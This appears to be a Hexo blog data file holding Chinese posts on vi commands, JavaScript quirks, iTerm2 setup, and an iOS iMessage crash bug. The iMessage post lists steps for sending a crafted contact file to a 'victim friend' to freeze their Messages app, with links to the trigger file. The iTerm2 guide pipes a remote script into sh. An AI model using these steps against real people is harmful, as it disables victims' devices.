title=\"删除命令\"></a>删除命令</h2><p>ndw或ndW：删除光标处开始及其后的n-1个字</p>\n<p>do：删至行首</p>\n<p>d$：删至行尾</p>\n<p>ndd：删除当前行及其后n-1行</p>\n<p>x或X：删除一个字符，x删除光标后的，而X删除光标前的</p>\n<p>Ctrl+u：删除输入方式下所输入的文本</p>\n<h2 id=\"搜索及替换命令\"><a href=\"#搜索及替换命令\" class=\"headerlink\" title=\"搜索及替换命令\"></a>搜索及替换命令</h2><p>/pattern：从光标开始处向文件尾搜索pattern</p>\n<p>?pattern：从光标开始处向文件首搜索pattern</p>\n<p>n：在同一方向重复上一次搜索命令</p>\n<p>N：在反方向上重复上一次搜索命令</p>\n<p>：s/p1/p2/g：将当前行中所有p1均用p2替代</p>\n<p>：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代</p>\n<p>：g/p1/s//p2/g：将文件中所有p1均用p2替换</p>\n<h2 id=\"选项设置\"><a href=\"#选项设置\" class=\"headerlink\" title=\"选项设置\"></a>选项设置</h2><p>all：列出所有选项设置情况</p>\n<p>term：设置终端类型</p>\n<p>ignorance：在搜索中忽略大小写</p>\n<p>list：显示制表位(Ctrl+I)和行尾标志（$)</p>\n<p>number：显示行号</p>\n<p>report：显示由面向行的命令修改过的数目</p>\n<p>terse：显示简短的警告信息</p>\n<p>warn：在转到别的文件时若没保存当前文件则显示NO write信息</p>\n<p>nomagic：允许在搜索模式中，使用前面不带“\\”的特殊字符</p>\n<p>nowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始</p>\n<p>mesg：允许vi显示其他用户用write写到自己终端上的信息</p>\n<h2 id=\"最后行方式命令\"><a href=\"#最后行方式命令\" class=\"headerlink\" title=\"最后行方式命令\"></a>最后行方式命令</h2><p>：n1,n2 co n3：将n1行到n2行之间的内容拷贝到第n3行下</p>\n<p>：n1,n2 m n3：将n1行到n2行之间的内容移至到第n3行下</p>\n<p>：n1,n2 d ：将n1行到n2行之间的内容删除</p>\n<p>：w ：保存当前文件</p>\n<p>：e filename：打开文件filename进行编辑</p>\n<p>：x：保存当前文件并退出</p>\n<p>：q：退出vi</p>\n<p>：q!：不保存文件并退出vi</p>\n<p>：!command：执行shell命令command</p>\n<p>：n1,n2 w!command：将文件中n1行至n2行的内容作为command的输入并执行之，若不指定n1，n2，则表示将整个文件内容作为command的输入</p>\n<p>：r!command：将命令command的输出结果放到当前行</p>\n<h2 id=\"寄存器操作\"><a href=\"#寄存器操作\" class=\"headerlink\" title=\"寄存器操作\"></a>寄存器操作</h2><p>“?nyy：将当前行及其下n行的内容保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?nyw：将当前行及其下n个字保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?nyl：将当前行及其下n个字符保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?p：取出寄存器？中的内容并将其放到光标位置处。这里？可以是一个字母，也可以是一个数字</p>\n<p>ndd：将当前行及其下共n行文本删除，并将所删内容放到1号删除寄存器中。</p>\n","excerpt":"","more":"<p>##<br><strong>进入vi的命令</strong></p>\n<p>vi filename :打开或新建文件，并将光标置于第一行首</p>\n<p>vi +n filename ：打开文件，并将光标置于第n行首</p>\n<p>vi + filename ：打开文件，并将光标置于最后一行首</p>\n<p>vi +/pattern filename：打开文件，并将光标置于第一个与pattern匹配的串处</p>\n<p>vi -r filename ：在上次正用vi编辑时发生系统崩溃，恢复filename</p>\n<p>vi filename….filename ：打开多个文件，依次进行编辑</p>\n<h2 id=\"移动光标类命令\"><a href=\"#移动光标类命令\" class=\"headerlink\" title=\"移动光标类命令\"></a>移动光标类命令</h2><p>h ：光标左移一个字符</p>\n<p>l ：光标右移一个字符</p>\n<p>space：光标右移一个字符</p>\n<p>Backspace：光标左移一个字符</p>\n<p>k或Ctrl+p：光标上移一行</p>\n<p>j或Ctrl+n ：光标下移一行</p>\n<p>Enter ：光标下移一行</p>\n<p>w或W ：光标右移一个字至字首</p>\n<p>b或B ：光标左移一个字至字首</p>\n<p>e或E ：光标右移一个字至字尾</p>\n<p>) ：光标移至句尾</p>\n<p>( ：光标移至句首</p>\n<p>}：光标移至段落开头</p>\n<p>{：光标移至段落结尾</p>\n<p>nG：光标移至第n行首</p>\n<p>n+：光标下移n行</p>\n<p>n-：光标上移n行</p>\n<p>n$：光标移至第n行尾</p>\n<p>H ：光标移至屏幕顶行</p>\n<p>M ：光标移至屏幕中间行</p>\n<p>L ：光标移至屏幕最后行</p>\n<p>0：（注意是数字零）光标移至当前行首</p>\n<p>$：光标移至当前行尾</p>\n<h2 id=\"屏幕翻滚类命令\"><a href=\"#屏幕翻滚类命令\" class=\"headerlink\" title=\"屏幕翻滚类命令\"></a>屏幕翻滚类命令</h2><p>Ctrl+u：向文件首翻半屏</p>\n<p>Ctrl+d：向文件尾翻半屏</p>\n<p>Ctrl+f：向文件尾翻一屏</p>\n<p>Ctrl＋b；向文件首翻一屏</p>\n<p>nz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。</p>\n<h2 id=\"插入文本类命令\"><a href=\"#插入文本类命令\" class=\"headerlink\" title=\"插入文本类命令\"></a>插入文本类命令</h2><p>i ：在光标前</p>\n<p>I ：在当前行首</p>\n<p>a：光标后</p>\n<p>A：在当前行尾</p>\n<p>o：在当前行之下新开一行</p>\n<p>O：在当前行之上新开一行</p>\n<p>r：替换当前字符</p>\n<p>R：替换当前字符及其后的字符，直至按ESC键</p>\n<p>s：从当前光标位置处开始，以输入的文本替代指定数目的字符</p>\n<p>S：删除指定数目的行，并以所输入文本代替之</p>\n<p>ncw或nCW：修改指定数目的字</p>\n<p>nCC：修改指定数目的行</p>\n<h2 id=\"删除命令\"><a href=\"#删除命令\" class=\"headerlink\" title=\"删除命令\"></a>删除命令</h2><p>ndw或ndW：删除光标处开始及其后的n-1个字</p>\n<p>do：删至行首</p>\n<p>d$：删至行尾</p>\n<p>ndd：删除当前行及其后n-1行</p>\n<p>x或X：删除一个字符，x删除光标后的，而X删除光标前的</p>\n<p>Ctrl+u：删除输入方式下所输入的文本</p>\n<h2 id=\"搜索及替换命令\"><a href=\"#搜索及替换命令\" class=\"headerlink\" title=\"搜索及替换命令\"></a>搜索及替换命令</h2><p>/pattern：从光标开始处向文件尾搜索pattern</p>\n<p>?pattern：从光标开始处向文件首搜索pattern</p>\n<p>n：在同一方向重复上一次搜索命令</p>\n<p>N：在反方向上重复上一次搜索命令</p>\n<p>：s/p1/p2/g：将当前行中所有p1均用p2替代</p>\n<p>：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代</p>\n<p>：g/p1/s//p2/g：将文件中所有p1均用p2替换</p>\n<h2 id=\"选项设置\"><a href=\"#选项设置\" class=\"headerlink\" title=\"选项设置\"></a>选项设置</h2><p>all：列出所有选项设置情况</p>\n<p>term：设置终端类型</p>\n<p>ignorance：在搜索中忽略大小写</p>\n<p>list：显示制表位(Ctrl+I)和行尾标志（$)</p>\n<p>number：显示行号</p>\n<p>report：显示由面向行的命令修改过的数目</p>\n<p>terse：显示简短的警告信息</p>\n<p>warn：在转到别的文件时若没保存当前文件则显示NO write信息</p>\n<p>nomagic：允许在搜索模式中，使用前面不带“\\”的特殊字符</p>\n<p>nowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始</p>\n<p>mesg：允许vi显示其他用户用write写到自己终端上的信息</p>\n<h2 id=\"最后行方式命令\"><a href=\"#最后行方式命令\" class=\"headerlink\" title=\"最后行方式命令\"></a>最后行方式命令</h2><p>：n1,n2 co n3：将n1行到n2行之间的内容拷贝到第n3行下</p>\n<p>：n1,n2 m n3：将n1行到n2行之间的内容移至到第n3行下</p>\n<p>：n1,n2 d ：将n1行到n2行之间的内容删除</p>\n<p>：w ：保存当前文件</p>\n<p>：e filename：打开文件filename进行编辑</p>\n<p>：x：保存当前文件并退出</p>\n<p>：q：退出vi</p>\n<p>：q!：不保存文件并退出vi</p>\n<p>：!command：执行shell命令command</p>\n<p>：n1,n2 w!command：将文件中n1行至n2行的内容作为command的输入并执行之，若不指定n1，n2，则表示将整个文件内容作为command的输入</p>\n<p>：r!command：将命令command的输出结果放到当前行</p>\n<h2 id=\"寄存器操作\"><a href=\"#寄存器操作\" class=\"headerlink\" title=\"寄存器操作\"></a>寄存器操作</h2><p>“?nyy：将当前行及其下n行的内容保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?nyw：将当前行及其下n个字保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?nyl：将当前行及其下n个字符保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?p：取出寄存器？中的内容并将其放到光标位置处。这里？可以是一个字母，也可以是一个数字</p>\n<p>ndd：将当前行及其下共n行文本删除，并将所删内容放到1号删除寄存器中。</p>"},{"title":"iOS 10 iMessage字符崩溃Bug又来了","date":"2017-01-02T03:49:54.000Z","_content":"\n这是一篇本人发表到Freebuf的文章。\n\n# 介绍\n\n近日，黑客@vincedes3发现了一个从iOS 8 到 iOS 10.2.1 b2通用的iMessage字符崩溃Bug，该Bug同样利用了和当年iOS 8的iMessage短信Bug的类似手法，将一段恶意代码发送给受害者，受害者在接收短信后，浏览短信即可中招，此后短信应用陷入死机状态，除非打开修复网页程序，否则再也无法打开短信应用。\n\n![1.png](http://image.3001.net/images/20170102/14833282151664.png!small)\n\n# 利用\n\n1\\. 下载利用文件 [点击这里下载](http://vincedes3.com/vincedes3.vcf)\n\n2\\. 把它传到 iCloud Drive, 百度云, 或者任何你能够在iPhone上下载到的地方\n\n3\\. 打开这个文件，点击分享，再点击 短信图标\n\n4\\. 通过iMessage把这个文件传给你的受害者好友\n\n5\\. 等待受害者点开短信，他会中招的\n\n6\\. 可以通过这个链接来修复 [点我修复](http://vincedes3.com/save.html)\n\n<embed src='http://player.youku.com/player.php/sid/XMTg5NTI3ODE2NA==/v.swf' allowFullScreen='true' quality='high' width='480' height='400' align='middle' allowScriptAccess='always' type='application/x-shockwave-flash'></embed>\n\n[demo视频](http://v.youku.com/v_show/id_XMTg5NTI3ODE2NA==.html#paction)\n\n# 工作原理\n\n在受害者打开短信的时候，触发了大量能够引起短信程序崩溃的字符，当用户浏览该短信的时候，cpu进行了大量的计算直到短信app点不动。当用户关掉短信程序后，再次打开短信程序，系统试图加载上一次内容，依然会触发该bug。\n\n![2.jpg](http://image.3001.net/images/20170102/14833289116916.jpg!small)\n\nTXT版本的触发代码: [http://vincedes3.com/crashtext.txt](http://www.example.com)\n\nHTML版本的触发代码: [http://vincedes3.com/crashtext.html](http://vincedes3.com/crashtext.html)\n\n# 修复\n\n1\\. 把这个链接发给受害者手机 [点我修复](http://vincedes3.com/save.html)\n\n2\\. 该链接会触发短信的快捷链接，点击打开\n\n3\\. 进入发送短信页面\n\n4\\. 点击取消\n\n5\\. 删掉发送者的短信即可解决bug，请勿再次尝试点入\n\n本文翻译自：[https://vincedes3.com/crash-message-app-iphone/](https://vincedes3.com/crash-message-app-iphone/)","source":"_posts/iOS-10-iMessage字符崩溃Bug又来了.md","raw":"---\ntitle: iOS 10 iMessage字符崩溃Bug又来了\ndate: 2017-01-02 03:49:54\ntags: Hack\ncategories: Hack\n---\n\n这是一篇本人发表到Freebuf的文章。\n\n# 介绍\n\n近日，黑客@vincedes3发现了一个从iOS 8 到 iOS 10.2.1 b2通用的iMessage字符崩溃Bug，该Bug同样利用了和当年iOS 8的iMessage短信Bug的类似手法，将一段恶意代码发送给受害者，受害者在接收短信后，浏览短信即可中招，此后短信应用陷入死机状态，除非打开修复网页程序，否则再也无法打开短信应用。\n\n![1.png](http://image.3001.net/images/20170102/14833282151664.png!small)\n\n# 利用\n\n1\\. 下载利用文件 [点击这里下载](http://vincedes3.com/vincedes3.vcf)\n\n2\\. 把它传到 iCloud Drive, 百度云, 或者任何你能够在iPhone上下载到的地方\n\n3\\. 打开这个文件，点击分享，再点击 短信图标\n\n4\\. 通过iMessage把这个文件传给你的受害者好友\n\n5\\. 等待受害者点开短信，他会中招的\n\n6\\. 可以通过这个链接来修复 [点我修复](http://vincedes3.com/save.html)\n\n<embed src='http://player.youku.com/player.php/sid/XMTg5NTI3ODE2NA==/v.swf' allowFullScreen='true' quality='high' width='480' height='400' align='middle' allowScriptAccess='always' type='application/x-shockwave-flash'></embed>\n\n[demo视频](http://v.youku.com/v_show/id_XMTg5NTI3ODE2NA==.html#paction)\n\n# 工作原理\n\n在受害者打开短信的时候，触发了大量能够引起短信程序崩溃的字符，当用户浏览该短信的时候，cpu进行了大量的计算直到短信app点不动。当用户关掉短信程序后，再次打开短信程序，系统试图加载上一次内容，依然会触发该bug。\n\n![2.jpg](http://image.3001.net/images/20170102/14833289116916.jpg!small)\n\nTXT版本的触发代码: [http://vincedes3.com/crashtext.txt](http://www.example.com)\n\nHTML版本的触发代码: [http://vincedes3.com/crashtext.html](http://vincedes3.com/crashtext.html)\n\n# 修复\n\n1\\. 把这个链接发给受害者手机 [点我修复](http://vincedes3.com/save.html)\n\n2\\. 该链接会触发短信的快捷链接，点击打开\n\n3\\. 进入发送短信页面\n\n4\\. 点击取消\n\n5\\. 删掉发送者的短信即可解决bug，请勿再次尝试点入\n\n本文翻译自：[https://vincedes3.com/crash-message-app-iphone/](https://vincedes3.com/crash-message-app-iphone/)","slug":"iOS-10-iMessage字符崩溃Bug又来了","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xom001t5es5d8cij0we","content":"<p>这是一篇本人发表到Freebuf的文章。</p>\n<h1 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h1><p>近日，黑客@vincedes3发现了一个从iOS 8 到 iOS 10.2.1 b2通用的iMessage字符崩溃Bug，该Bug同样利用了和当年iOS 8的iMessage短信Bug的类似手法，将一段恶意代码发送给受害者，受害者在接收短信后，浏览短信即可中招，此后短信应用陷入死机状态，除非打开修复网页程序，否则再也无法打开短信应用。</p>\n<p><img src=\"http://image.3001.net/images/20170102/14833282151664.png!small\" alt=\"1.png\"></p>\n<h1 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h1><p>1. 下载利用文件 <a href=\"http://vincedes3.com/vincedes3.vcf\" target=\"_blank\" rel=\"external\">点击这里下载</a></p>\n<p>2. 把它传到 iCloud Drive, 百度云, 或者任何你能够在iPhone上下载到的地方</p>\n<p>3. 打开这个文件，点击分享，再点击 短信图标</p>\n<p>4. 通过iMessage把这个文件传给你的受害者好友</p>\n<p>5. 等待受害者点开短信，他会中招的</p>\n<p>6. 可以通过这个链接来修复 <a href=\"http://vincedes3.com/save.html\" target=\"_blank\" rel=\"external\">点我修复</a></p>\n<embed src=\"http://player.youku.com/player.php/sid/XMTg5NTI3ODE2NA==/v.swf\" allowfullscreen=\"true\" quality=\"high\" width=\"480\" height=\"400\" align=\"middle\" allowscriptaccess=\"always\" type=\"application/x-shockwave-flash\">\n\n<p><a href=\"http://v.youku.com/v_show/id_XMTg5NTI3ODE2NA==.html#paction\" target=\"_blank\" rel=\"external\">demo视频</a></p>\n<h1 id=\"工作原理\"><a href=\"#工作原理\" class=\"headerlink\" title=\"工作原理\"></a>工作原理</h1><p>在受害者打开短信的时候，触发了大量能够引起短信程序崩溃的字符，当用户浏览该短信的时候，cpu进行了大量的计算直到短信app点不动。当用户关掉短信程序后，再次打开短信程序，系统试图加载上一次内容，依然会触发该bug。</p>\n<p><img src=\"http://image.3001.net/images/20170102/14833289116916.jpg!small\" alt=\"2.jpg\"></p>\n<p>TXT版本的触发代码: <a href=\"http://www.example.com\" target=\"_blank\" rel=\"external\">http://vincedes3.com/crashtext.txt</a></p>\n<p>HTML版本的触发代码: <a href=\"http://vincedes3.com/crashtext.html\" target=\"_blank\" rel=\"external\">http://vincedes3.com/crashtext.html</a></p>\n<h1 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h1><p>1. 把这个链接发给受害者手机 <a href=\"http://vincedes3.com/save.html\" target=\"_blank\" rel=\"external\">点我修复</a></p>\n<p>2. 该链接会触发短信的快捷链接，点击打开</p>\n<p>3. 进入发送短信页面</p>\n<p>4. 点击取消</p>\n<p>5. 删掉发送者的短信即可解决bug，请勿再次尝试点入</p>\n<p>本文翻译自：<a href=\"https://vincedes3.com/crash-message-app-iphone/\" target=\"_blank\" rel=\"external\">https://vincedes3.com/crash-message-app-iphone/</a></p>\n","excerpt":"","more":"<p>这是一篇本人发表到Freebuf的文章。</p>\n<h1 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h1><p>近日，黑客@vincedes3发现了一个从iOS 8 到 iOS 10.2.1 b2通用的iMessage字符崩溃Bug，该Bug同样利用了和当年iOS 8的iMessage短信Bug的类似手法，将一段恶意代码发送给受害者，受害者在接收短信后，浏览短信即可中招，此后短信应用陷入死机状态，除非打开修复网页程序，否则再也无法打开短信应用。</p>\n<p><img src=\"http://image.3001.net/images/20170102/14833282151664.png!small\" alt=\"1.png\"></p>\n<h1 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h1><p>1. 下载利用文件 <a href=\"http://vincedes3.com/vincedes3.vcf\">点击这里下载</a></p>\n<p>2. 把它传到 iCloud Drive, 百度云, 或者任何你能够在iPhone上下载到的地方</p>\n<p>3. 打开这个文件，点击分享，再点击 短信图标</p>\n<p>4. 通过iMessage把这个文件传给你的受害者好友</p>\n<p>5. 等待受害者点开短信，他会中招的</p>\n<p>6. 可以通过这个链接来修复 <a href=\"http://vincedes3.com/save.html\">点我修复</a></p>\n<embed src='http://player.youku.com/player.php/sid/XMTg5NTI3ODE2NA==/v.swf' allowFullScreen='true' quality='high' width='480' height='400' align='middle' allowScriptAccess='always' type='application/x-shockwave-flash'></embed>\n\n<p><a href=\"http://v.youku.com/v_show/id_XMTg5NTI3ODE2NA==.html#paction\">demo视频</a></p>\n<h1 id=\"工作原理\"><a href=\"#工作原理\" class=\"headerlink\" title=\"工作原理\"></a>工作原理</h1><p>在受害者打开短信的时候，触发了大量能够引起短信程序崩溃的字符，当用户浏览该短信的时候，cpu进行了大量的计算直到短信app点不动。当用户关掉短信程序后，再次打开短信程序，系统试图加载上一次内容，依然会触发该bug。</p>\n<p><img src=\"http://image.3001.net/images/20170102/14833289116916.jpg!small\" alt=\"2.jpg\"></p>\n<p>TXT版本的触发代码: <a href=\"http://www.example.com\">http://vincedes3.com/crashtext.txt</a></p>\n<p>HTML版本的触发代码: <a href=\"http://vincedes3.com/crashtext.html\">http://vincedes3.com/crashtext.html</a></p>\n<h1 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h1><p>1. 把这个链接发给受害者手机 <a href=\"http://vincedes3.com/save.html\">点我修复</a></p>\n<p>2. 该链接会触发短信的快捷链接，点击打开</p>\n<p>3. 进入发送短信页面</p>\n<p>4. 点击取消</p>\n<p>5. 删掉发送者的短信即可解决bug，请勿再次尝试点入</p>\n<p>本文翻译自：<a href=\"https://vincedes3.com/crash-message-app-iphone/\">https://vincedes3.com/crash-message-app-iphone/</a></p>\n"},{"title":"Wat 吐槽JavaScript","date":"2016-12-21T01:17:26.000Z","header-img":"/content/images/wat/home-bg-o.jpg","_content":"\n今天晚上在研究React技术栈头疼的时候，突然看到一个吐槽JavaScript的视频，简直搞笑，不过也挺客观的，毕竟是一个10天内攒出来的语言，虽然现在发展有ES支撑，但是依然非常零散，不过我按照视频里的做法试了一下，似乎有的返回结果不太一样。\n\n# Wat\n\n[![](https://www.destroyallsoftware.com/images/posters/talks/wat.poster.png)](https://www.destroyallsoftware.com/talks/wat)\n\n\n```javascript\n[] + []\n\"\"\n[] + {}\n\"[object Object]\"\n{} + []\n0\n{} + {}\n\"[object Object][object Object]\"\nArray(16)\n[undefined × 16]\nArray(16).join(\"wat\")\n\"watwatwatwatwatwatwatwatwatwatwatwatwatwatwat\"\nArray(16).join(\"wat\" - 1 ) + \" Batman!\"\n\"NaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaN Batman!\"\n```\n总之，看完这个视频，我就想说一句：\n\n![](/content/images/wat/1.jpg)\n\n\n# Javascript的出生与死亡\n\n此外还有另一个视频 对JS从1995-2035年的历史阐述及大胆预测。\n\n\n\n[![](https://www.destroyallsoftware.com/images/posters/talks/the-birth-and-death-of-javascript.poster.png)](https://www.destroyallsoftware.com/talks/the-birth-and-death-of-javascript)\n\n\n十分客观的罗列出了JS的缺点、当前JS发展趋势必然产生的低效率问题。\n\n![](/content/images/wat/2.png)\n","source":"_posts/WAT-搞笑吐槽JavaScript.md","raw":"---\ntitle: Wat 吐槽JavaScript\ndate: 2016-12-21 01:17:26\ntags:\n - 笑话\n - Web\ncategories: 笑话\npermalink: wat\nheader-img: \"/content/images/wat/home-bg-o.jpg\"\n\n---\n\n今天晚上在研究React技术栈头疼的时候，突然看到一个吐槽JavaScript的视频，简直搞笑，不过也挺客观的，毕竟是一个10天内攒出来的语言，虽然现在发展有ES支撑，但是依然非常零散，不过我按照视频里的做法试了一下，似乎有的返回结果不太一样。\n\n# Wat\n\n[![](https://www.destroyallsoftware.com/images/posters/talks/wat.poster.png)](https://www.destroyallsoftware.com/talks/wat)\n\n\n```javascript\n[] + []\n\"\"\n[] + {}\n\"[object Object]\"\n{} + []\n0\n{} + {}\n\"[object Object][object Object]\"\nArray(16)\n[undefined × 16]\nArray(16).join(\"wat\")\n\"watwatwatwatwatwatwatwatwatwatwatwatwatwatwat\"\nArray(16).join(\"wat\" - 1 ) + \" Batman!\"\n\"NaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaN Batman!\"\n```\n总之，看完这个视频，我就想说一句：\n\n![](/content/images/wat/1.jpg)\n\n\n# Javascript的出生与死亡\n\n此外还有另一个视频 对JS从1995-2035年的历史阐述及大胆预测。\n\n\n\n[![](https://www.destroyallsoftware.com/images/posters/talks/the-birth-and-death-of-javascript.poster.png)](https://www.destroyallsoftware.com/talks/the-birth-and-death-of-javascript)\n\n\n十分客观的罗列出了JS的缺点、当前JS发展趋势必然产生的低效率问题。\n\n![](/content/images/wat/2.png)\n","slug":"wat","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xoo001v5es5zkhqw3u3","content":"<p>今天晚上在研究React技术栈头疼的时候，突然看到一个吐槽JavaScript的视频，简直搞笑，不过也挺客观的，毕竟是一个10天内攒出来的语言，虽然现在发展有ES支撑，但是依然非常零散，不过我按照视频里的做法试了一下，似乎有的返回结果不太一样。</p>\n<h1 id=\"Wat\"><a href=\"#Wat\" class=\"headerlink\" title=\"Wat\"></a>Wat</h1><p><a href=\"https://www.destroyallsoftware.com/talks/wat\" target=\"_blank\" rel=\"external\"><img src=\"https://www.destroyallsoftware.com/images/posters/talks/wat.poster.png\" alt=\"\"></a></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">[] + []</div><div class=\"line\"><span class=\"string\">\"\"</span></div><div class=\"line\">[] + &#123;&#125;</div><div class=\"line\"><span class=\"string\">\"[object Object]\"</span></div><div class=\"line\">&#123;&#125; + []</div><div class=\"line\"><span class=\"number\">0</span></div><div class=\"line\">&#123;&#125; + &#123;&#125;</div><div class=\"line\"><span class=\"string\">\"[object Object][object Object]\"</span></div><div class=\"line\"><span class=\"built_in\">Array</span>(<span class=\"number\">16</span>)</div><div class=\"line\">[<span class=\"literal\">undefined</span> × <span class=\"number\">16</span>]</div><div class=\"line\"><span class=\"built_in\">Array</span>(<span class=\"number\">16</span>).join(<span class=\"string\">\"wat\"</span>)</div><div class=\"line\"><span class=\"string\">\"watwatwatwatwatwatwatwatwatwatwatwatwatwatwat\"</span></div><div class=\"line\"><span class=\"built_in\">Array</span>(<span class=\"number\">16</span>).join(<span class=\"string\">\"wat\"</span> - <span class=\"number\">1</span> ) + <span class=\"string\">\" Batman!\"</span></div><div class=\"line\"><span class=\"string\">\"NaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaN Batman!\"</span></div></pre></td></tr></table></figure>\n<p>总之，看完这个视频，我就想说一句：</p>\n<p><img src=\"/content/images/wat/1.jpg\" alt=\"\"></p>\n<h1 id=\"Javascript的出生与死亡\"><a href=\"#Javascript的出生与死亡\" class=\"headerlink\" title=\"Javascript的出生与死亡\"></a>Javascript的出生与死亡</h1><p>此外还有另一个视频 对JS从1995-2035年的历史阐述及大胆预测。</p>\n<p><a href=\"https://www.destroyallsoftware.com/talks/the-birth-and-death-of-javascript\" target=\"_blank\" rel=\"external\"><img src=\"https://www.destroyallsoftware.com/images/posters/talks/the-birth-and-death-of-javascript.poster.png\" alt=\"\"></a></p>\n<p>十分客观的罗列出了JS的缺点、当前JS发展趋势必然产生的低效率问题。</p>\n<p><img src=\"/content/images/wat/2.png\" alt=\"\"></p>\n","excerpt":"","more":"<p>今天晚上在研究React技术栈头疼的时候，突然看到一个吐槽JavaScript的视频，简直搞笑，不过也挺客观的，毕竟是一个10天内攒出来的语言，虽然现在发展有ES支撑，但是依然非常零散，不过我按照视频里的做法试了一下，似乎有的返回结果不太一样。</p>\n<h1 id=\"Wat\"><a href=\"#Wat\" class=\"headerlink\" title=\"Wat\"></a>Wat</h1><p><a href=\"https://www.destroyallsoftware.com/talks/wat\"><img src=\"https://www.destroyallsoftware.com/images/posters/talks/wat.poster.png\" alt=\"\"></a></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">[] + []</div><div class=\"line\"><span class=\"string\">\"\"</span></div><div class=\"line\">[] + &#123;&#125;</div><div class=\"line\"><span class=\"string\">\"[object Object]\"</span></div><div class=\"line\">&#123;&#125; + []</div><div class=\"line\"><span class=\"number\">0</span></div><div class=\"line\">&#123;&#125; + &#123;&#125;</div><div class=\"line\"><span class=\"string\">\"[object Object][object Object]\"</span></div><div class=\"line\"><span class=\"built_in\">Array</span>(<span class=\"number\">16</span>)</div><div class=\"line\">[<span class=\"literal\">undefined</span> × <span class=\"number\">16</span>]</div><div class=\"line\"><span class=\"built_in\">Array</span>(<span class=\"number\">16</span>).join(<span class=\"string\">\"wat\"</span>)</div><div class=\"line\"><span class=\"string\">\"watwatwatwatwatwatwatwatwatwatwatwatwatwatwat\"</span></div><div class=\"line\"><span class=\"built_in\">Array</span>(<span class=\"number\">16</span>).join(<span class=\"string\">\"wat\"</span> - <span class=\"number\">1</span> ) + <span class=\"string\">\" Batman!\"</span></div><div class=\"line\"><span class=\"string\">\"NaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaN Batman!\"</span></div></pre></td></tr></table></figure>\n<p>总之，看完这个视频，我就想说一句：</p>\n<p><img src=\"/content/images/wat/1.jpg\" alt=\"\"></p>\n<h1 id=\"Javascript的出生与死亡\"><a href=\"#Javascript的出生与死亡\" class=\"headerlink\" title=\"Javascript的出生与死亡\"></a>Javascript的出生与死亡</h1><p>此外还有另一个视频 对JS从1995-2035年的历史阐述及大胆预测。</p>\n<p><a href=\"https://www.destroyallsoftware.com/talks/the-birth-and-death-of-javascript\"><img src=\"https://www.destroyallsoftware.com/images/posters/talks/the-birth-and-death-of-javascript.poster.png\" alt=\"\"></a></p>\n<p>十分客观的罗列出了JS的缺点、当前JS发展趋势必然产生的低效率问题。</p>\n<p><img src=\"/content/images/wat/2.png\" alt=\"\"></p>\n"},{"title":"iTerm2 美化全过程","id":"2","updated":"2016-08-05T20:14:29.000Z","date":"2016-07-28T08:49:20.000Z","_content":"\n\n本文介绍了iTerm2的美化过程，包括安装oh my zsh，powerline，以及对vim的美化。\n# 1.首先下载 iTerm 2\n# 2.打开iTerm 2\n# 3.输入下面指令安装oh-my-zsh\n`curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh`\n# 4.接下来安装Powerline\n在官网有教程，我们只需要执行官网第一条安装指令就行\n如果你的终端能够正常执行pip指令，那么直接执行下面的指令可以完成安装\n\n`pip install powerline-status`\n\n如果没有，则先执行安装pip指令\n\n`sudo easy_install pip`\n\n# 5.下载、安装库字体库\n1）将工程下载下来后cd到`install.sh`文件所在目录\n2）执行指令安装字体库\n\n执行`./install.sh`指令安装所有Powerline字体\n\n安装完成后提示所有字体均已下载到`/Users/superdanny/Library/Fonts`路径下\n`All Powerline fonts installed to /Users/superdanny/Library/Fonts`\n\n# 6. 设置iTerm 2的Regular Font 和 Non-ASCII Font\n\n安装完字体库之后，把iTerm 2的设置里的Profile中的Text 选项卡中里的Regular Font和Non-ASCII Font的字体都设置成 Powerline的字体，我这里设置的字体是12pt Meslo LG S DZ Regular for Powerline\n\n### 7. 配色方案\n1）安装配色方案\n进入刚刚下载的工程的solarized/iterm2-colors-solarized 下双击 Solarized Dark.itermcolors 和 Solarized Light.itermcolors 两个文件就可以把配置文件导入到 iTerm2 